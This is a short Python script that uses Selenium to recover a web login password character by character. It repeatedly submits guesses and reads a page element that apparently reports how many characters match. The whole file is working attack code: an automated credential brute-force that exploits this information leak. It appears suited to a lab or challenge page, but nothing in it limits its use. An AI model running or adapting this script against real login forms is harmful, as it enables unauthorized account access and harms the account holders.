import re
import selenium.common
from selenium.webdriver.common.by import By
import string
import time


def find_password(driver, username: str, password_length: int):
    all_characters = string.printable
    length = 2
    password_guessed = ""

    while True:
        tmp_character = ""

        try:
            response_message_element = driver.find_element(By.ID, "responseMessage")
            response_message_text = response_message_element.text
            if int(extract_numbers(response_message_text)) == password_length:
                break
            for character in all_characters:
                tmp_character = character
                password_guess = password_guessed + character
                print(fill_password(password_guess, password_length))

                driver.find_element(By.NAME, "username").clear()
                driver.find_element(By.NAME, "username").send_keys(username)
                driver.find_element(By.NAME, "password").clear()
                driver.find_element(By.NAME, "password").send_keys(fill_password(password_guess, password_length))
                driver.find_element(By.CLASS_NAME, "btn-primary").click()
                time.sleep(0.1)

                response_message_element = driver.find_element(By.ID, "responseMessage")
                response_message_text = response_message_element.text

                if int(extract_numbers(response_message_text)) == length:
                    length += 1
                    password_guessed += character
                    print(password_guessed)
                    break

        except selenium.common.NoSuchElementException:
            password_guessed += tmp_character
            print("Most likely found password: " + fill_password(password_guessed, password_length))
            break


def extract_numbers(input_string) -> int:
    # Define a regular expression pattern to match numbers
    pattern = r'\d+'
    # Use re.search to find the first match of the pattern in the input string
    match = re.search(pattern, input_string)

    # Check if a match is found and return the matched number, or return None
    if match:
        return int(match.group())
    else:
        return 0


def fill_password(input_string: str, password_length: int) -> str:
    correct_length = password_length - len(input_string)
    return input_string + correct_length * '-'
